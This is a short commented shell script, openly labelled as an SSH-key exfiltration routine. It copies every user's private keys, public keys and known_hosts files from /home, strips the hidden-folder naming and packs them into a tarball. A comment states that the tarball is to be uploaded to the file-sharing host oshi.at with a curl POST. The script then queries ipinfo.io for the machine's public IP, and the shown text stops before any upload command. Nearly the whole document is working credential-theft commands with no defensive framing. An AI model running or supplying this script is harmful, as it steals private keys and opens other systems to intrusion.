##	Preparation

mkdir ./ssh-exfil
#	creating a working directory



##		collecting the ssh keys, pubkeys and known-hosts

	rsync -a --prune-empty-dirs --include '*/' --include 'id_*' --include 'known_hosts' --exclude '*' /home ./ssh-exfil
#		find all ssh-keys, ssh-pubkeys and known-hosts files for users and copy them into the subfolder ./ssh-exfil
#		see also:	https://unix.stackexchange.com/questions/83593/copy-specific-file-type-keeping-the-folder-structure/83596#83596



##		basic cleanup

	for i in $(find . -name ".ssh" -type d)
		do
			cd $i
			cd ./..
			mv .ssh ssh
			cd ./..
			cd ./..
	done
#	rename all extracted ".ssh" subfolders into "ssh" so that they ain't hidden anymore

##	getting ready to exfiltrate

tar cfv ssh-exfil.tar ./ssh-exfil/
#	pack the exfiltrated data into a tarball

rm -rf ./ssh-exfil
#	remove the working directory



##	exfiltrate the file

touch ./work.log
#   creating logfile

#		Transfers file to oshi.at using curl POST
#			This could also be done with any other service

	curl ipinfo.io/ip
#		determining public IP adress
